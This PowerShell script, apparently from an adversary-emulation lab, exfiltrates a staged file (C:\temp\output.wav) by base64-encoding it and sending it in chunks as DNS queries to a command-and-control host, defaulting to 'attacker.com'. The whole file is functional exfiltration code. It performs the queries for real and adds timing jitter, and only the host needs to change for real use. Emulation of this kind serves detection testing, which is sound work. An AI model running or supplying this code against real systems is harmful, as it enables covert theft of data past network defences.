<#
.SYNOPSIS
    Exfiltrates data via DNS queries.
.DESCRIPTION
    Reads C:\temp\output.wav, base64 encodes it, and sends it in chunks via DNS A records to the C2 server.
#>

param (
    [string]$C2Host = $env:C2_HOST
)

if ([string]::IsNullOrWhiteSpace($C2Host) -or $C2Host -eq "127.0.0.1") {
    $C2Host = "attacker.com" # Fallback for demo
    Write-Host "[!] Warning: No C2 Host provided. Defaulting to $C2Host" -ForegroundColor Yellow
}

$StagingFile = "C:\temp\output.wav"
$ChunkSize = 32 # Bytes per chunk to keep DNS labels small

Write-Host "[*] Starting DNS Exfiltration to C2: $C2Host" -ForegroundColor Green

# 1. Check if file exists
if (-not (Test-Path -Path $StagingFile)) {
    Write-Host "[!] Error: Staging file not found at $StagingFile. Run Initial Access scenario first." -ForegroundColor Red
    exit 1
}

# 2. Read and Encode Data
Write-Host "[*] Reading payload: $StagingFile"
try {
    $bytes = [System.IO.File]::ReadAllBytes($StagingFile)
    $b64 = [Convert]::ToBase64String($bytes)
    Write-Host "[+] File read. Total Length (Base64): $($b64.Length) chars"
} catch {
    Write-Host "[!] Failed to read file: $_" -ForegroundColor Red
    exit 1
}

# 3. Exfiltrate in Chunks
$totalChunks = [Math]::Ceiling($b64.Length / $ChunkSize)
Write-Host "[*] Exfiltrating in $totalChunks chunks..."

for ($i = 0; $i -lt $totalChunks; $i++) {
    $start = $i * $ChunkSize
    $length = [Math]::Min($ChunkSize, $b64.Length - $start)
    $chunk = $b64.Substring($start, $length)
    
    # Construct Query
    # Format: <id>.<chunk_seq>.<data>.<c2_host>
    # Note: Real DNS exfil needs hex encoding or pure alphanumeric. B64 has symbols like + / = which are not valid in basic hostnames sometimes.
    # For this simulation, we'll replace + with -, / with _, and = with .
    $safeChunk = $chunk.Replace('+', '-').Replace('/', '_').Replace('=', '')
    
    $query = "exfil.$i.$safeChunk.$C2Host"
    
    Write-Host "    -> Query: $query"
    
    try {
        # Active Execution: Actually perform the query
        Resolve-DnsName -Name $query -Type A -ErrorAction SilentlyContinue | Out-Null
    } catch {
        # Ignore resolution errors, we expect NXDOMAIN often for dummy C2
    }
    
    Start-Sleep -Milliseconds 100 # Jitter
}

Write-Host "[+] DNS Exfiltration Complete." -ForegroundColor Green
